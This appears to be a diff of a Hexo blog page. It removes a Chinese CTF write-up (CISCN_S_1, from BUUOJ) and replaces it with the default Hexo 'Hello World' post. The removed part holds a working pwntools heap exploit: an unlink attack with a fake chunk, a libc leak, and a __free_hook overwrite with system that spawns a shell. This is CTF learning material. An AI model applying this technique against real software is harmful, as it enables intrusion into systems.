@@ -9,7 +9,7 @@
     
     <title>
         
-            CISCN_S_1 |
+            Hello World |
         
         桥下少年
     </title>
@@ -170,7 +170,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">CISCN_S_1</span>
+            <span class="title-hover-animation">Hello World</span>
         </div>
 
         
@@ -189,43 +189,21 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2021-11-02 19:06:08</span>
-        <span class="mobile">2021-11-02 19:06</span>
+        <span class="pc">2022-03-15 11:32:40</span>
+        <span class="mobile">2022-03-15 11:32</span>
     </span>
     
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/BUU/">BUU</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/PWN/">PWN</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
     
 
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>569 字</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>75 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>3 分钟</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>1 分钟</span>
         </span>
     
     
@@ -241,11 +219,19 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="记录一下这题的思路"><a href="#记录一下这题的思路" class="headerlink" title="记录一下这题的思路"></a>记录一下这题的思路</h1><p>exp借鉴别人的师傅修改。</p>
-<p>这里记录一下unlink的正确利用姿势；我们在连续申请了多个堆块后，选取一个目的chunk作为unlink的对象，从chunk的men开始，我们开始构造fake chunk，</p>
-<p>这里的fake chunk，它的size有一定的要求，需要满足到下一个chunk的prev_size的大小与该size相等。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">from pwn <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">p </span>= process(<span class="string">&#x27;./ciscn_s_1&#x27;</span>)</span><br><span class="line"><span class="meta"># p=remote(<span class="meta-string">&#x27;node4.buuoj.cn&#x27;</span>,27763)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./ciscn_s_1&#x27;</span>)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/home/lol/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx,size,content):</span><br><span class="line">    p.recvuntil(b<span class="string">&quot;4.show\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="number">&#x27;</span>index:\n<span class="number">&#x27;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(b<span class="number">&#x27;</span>size:\n<span class="number">&#x27;</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(b<span class="number">&#x27;</span>content:\n<span class="number">&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def add1(idx,size,content):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;4.show\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;index:\n&#x27;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:\n&#x27;</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;gift: &#x27;</span>)</span><br><span class="line">    heap=<span class="keyword">int</span>(p.recvline(keepends=False),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    <span class="keyword">return</span>(heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    p.recvuntil(b<span class="string">&quot;4.show\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="number">&#x27;</span>index:\n<span class="number">&#x27;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(b<span class="number">&#x27;</span>content:\n<span class="number">&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    p.recvuntil(b<span class="string">&quot;4.show\n&quot;</span>)</span><br><span class="line">    p.sendline(b<span class="number">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="string">&quot;index:\n&quot;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(idx):</span><br><span class="line">    p.recvuntil(b<span class="string">&quot;4.show\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(b<span class="number">&#x27;</span>index:\n<span class="number">&#x27;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key1 = <span class="number">0x06022BC</span></span><br><span class="line">key2 = <span class="number">0x06022B8</span></span><br><span class="line">pro = <span class="number">0x6021E0</span></span><br><span class="line">    <span class="meta">#get unsorted bin</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf8</span>,str(i)*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0xf8</span>,<span class="string">&#x27;7&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="number">0xf8</span>,<span class="string">&#x27;20202020&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">&#x27;8&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xf8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line">addr = <span class="number">0x6020e0</span>+<span class="number">8</span>*<span class="number">32</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)</span><br><span class="line">payload += p64(addr<span class="number">-0x18</span>)+p64(addr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>,b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0xf0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    <span class="built_in">free</span>(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">32</span>,payload)                    #这里是将序号为<span class="number">32</span>的堆块通过unlink改写到<span class="number">0x6021e0</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">8</span>)                            #触发unlink</span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line">payload = p64(<span class="number">0x0000000000601fa0</span>)</span><br><span class="line">payload += p64(pro<span class="number">-0x18</span>)+p64(pro<span class="number">-0x18</span>)</span><br><span class="line">payload += p64(pro)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x0000000a00000001</span>)</span><br><span class="line">edit(<span class="number">32</span>,payload)</span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line">show(<span class="number">29</span>)</span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="string">&quot;\x00&quot;</span>))-libc.sym[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;libc base ==&gt; &quot;</span>+hex(libc_base))</span><br><span class="line">success(<span class="string">&quot;free_hook ==&gt; &quot;</span>+hex(free_hook))</span><br><span class="line">success(<span class="string">&quot;_libc_system ==&gt; &quot;</span>+hex(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">32</span>,p64(free_hook))</span><br><span class="line">edit(<span class="number">32</span>,p64(system))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">9</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+            <p><strong>Welcome to <a class="link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link" target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub<i class="fas fa-external-link-alt"></i></a>.</strong></p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
+<p>More info: <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link" target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment<i class="fas fa-external-link-alt"></i></a></p>
 
         </div>
 
@@ -253,11 +239,11 @@
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul>
-        <li>本文标题：CISCN_S_1</li>
+        <li>本文标题：Hello World</li>
         <li>本文作者：LOLOLO</li>
-        <li>创建时间：2021-11-02 19:06:08</li>
+        <li>创建时间：2022-03-15 11:32:40</li>
         <li>
-            本文链接：https://lololo-pwn.github.io/2021/11/02/ciscn-s-1/
+            本文链接：https://lololo-pwn.github.io/2022/03/15/hello-world/
         </li>
         <li>
             版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -269,14 +255,6 @@
         
 
         
-            <ul class="post-tags-box">
-                
-                    <li class="tag-item">
-                        <a href="/tags/PWN/">#PWN</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
 
         
             <div class="article-nav">
@@ -284,13 +262,13 @@
                     <div class="article-prev">
                         <a class="prev"
                            rel="prev"
-                           href="/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9-pwn1/"
+                           href="/2022/03/15/setcontext/"
                         >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">陇原战役 PWN</span>
+                                <span class="post-nav-title-item">setcontext</span>
                                 <span class="post-nav-item">上一篇</span>
                             </span>
                         </a>
@@ -300,10 +278,10 @@
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2021/11/01/%E8%AE%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%B9%E6%B3%95/"
+                           href="/2022/03/15/exit-hook/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">倒叙输出flag</span>
+                                <span class="post-nav-title-item">exit_hook</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -511,7 +489,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E8%BF%99%E9%A2%98%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="nav-number">1.</span> <span class="nav-text">记录一下这题的思路</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
     </div>
 </div>
         </aside>
